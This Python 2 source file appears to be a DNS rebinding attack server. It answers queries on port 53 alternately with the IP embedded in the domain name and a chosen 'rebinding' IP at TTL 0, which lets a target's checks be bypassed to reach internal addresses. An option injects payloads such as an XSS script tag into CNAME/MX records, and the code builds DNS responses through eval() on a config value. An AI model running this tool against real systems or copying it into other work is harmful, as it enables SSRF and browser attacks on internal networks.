#!/usr/bin/env python
# -*- coding:utf-8 -*-


import sys
import ipaddr
import dnslib
import argparse
import SocketServer
from lib import common


class DnsAutoRebinding(SocketServer.UDPServer):
    def __init__(self, options):
        SocketServer.UDPServer.__init__(self, ('0.0.0.0', 53), self.Shandle)
        self.timeout = 3
        self.options = options

    def handle_timeout(self):
        print("handle timeout.")

    class Shandle(SocketServer.DatagramRequestHandler):
        def __init__(self, *args, **kwargs):
            SocketServer.DatagramRequestHandler.__init__(self, *args, **kwargs)

        def handle(self):
            """
            处理dns 请求

            rebindflag 只有 True， 0 1 2 4个值，初始化是0，以后就在1,2之间变化，如果你手工设置rebindflag为‘True’，则record 返回remote_addr
            根据rebindflag 的值返回record的结果
            rebindflag=1 时候返回rebinding设置的IP
            rebindflag为0或者2的时候返回 正常IP（比如域名是：123.123.1.1.qingbx.com，则返回123.123.1.1
            域名的格式必须为IP.你注册的域名，这里IP为123.123.1.1， 控制的域名为qingbx.com
            你需要在域名注册商哪里将NS指向此DNS解析）

            :return:
            """
            record = ''
            ttl = int(common.conf_read('ttl'))
            record_type = common.conf_read('record_type')
            rebinding = common.conf_read('rebinding')
            rebindflag = int(common.conf_read('rebindflag'))

            client = self.client_address
            req = dnslib.DNSRecord.parse(self.packet).reply()
            qname = req.q.qname.__str__()

            if rebinding != 'False' and rebindflag == 1:
                if rebinding == 'True':
                    record = client[0]
                else:
                    record = rebinding
                common.conf_set({"rebindflag": "2"})
            else:
                record = common.analy_req(qname)
                common.conf_set({"rebindflag": "1"})

            try:
                if record:
                    # 构造DNS响应报文
                    try:
                        req.add_answer(dnslib.RR(qname, eval('dnslib.QTYPE.{}'.format(record_type)),
                                                 rdata=eval('dnslib.{}(record)'.format(record_type)), ttl=ttl))
                    except:
                        record = '8.8.8.8'
                        req.add_answer(dnslib.RR(qname, eval('dnslib.QTYPE.{}'.format(record_type)),
                                                 rdata=eval('dnslib.{}(record)'.format(record_type)), ttl=ttl))
                        print "not a needed domain"

                else:
                    print 'found query'
            except Exception, e:
                sys.exit(e.message)

            print common.server_output(client, qname)
            self.wfile.write(req.pack())  # 返回给DNS客户端结果

    def run(self):
        print '[+] Set Config ...'
        common.conf_set(self.options)

        print '[+] Start Listening ...'
        self.serve_forever()


if __name__ == '__main__':
    parser = argparse.ArgumentParser('sudo python main.py {Options}')
    parser.add_argument('-t', '--TTL', dest='ttl', help='ttl value , 0 By Default', default=0, type=int, metavar='300')
    parser.add_argument('-y', '--Type', dest='record_type', help='Record Type , A By Default', default='A', type=str,
                        metavar='A/AAAA/CNAME/MX')
    parser.add_argument('-e', '--Encoding', dest='encoding', help='Record Encoding , None By Default', default=None,
                        type=str, metavar='int/hex/en')
    parser.add_argument('-r', '--Rebinding', dest='rebinding', help='The Second Time Query Return Target Ip',
                        action='store_true', default=False)
    parser.add_argument('-p', '--payload', dest='payload', help='Specified Record , Support CNAME/MX', type=str,
                        metavar='<script>alert(/xss/)</script>www.google.com')

    options = parser.parse_args()
    options.record_type = options.record_type.upper()

    if options.payload and options.record_type not in ['CNAME', 'MX']:
        sys.exit('[!] You choose payload , Please Specified Record Type , CNAME or MX')

    if options.record_type == 'AAAA' and options.encoding not in ['hex', 'int']:
        sys.exit('[!] You set record_type is AAAA, Please Specified Encoding , hex or int')

    if options.rebinding:
        rand = raw_input("Input Safe Ip? [Address/Req By Default]:  ")

        if rand != 'True':
            try:
                if ipaddr.IPAddress(rand).version in [4, 6]:
                    options.rebinding = rand
            except ValueError:
                sys.exit('the rebinding IP You config is invalid ')

    DnsAutoRebinding(options.__dict__).run()
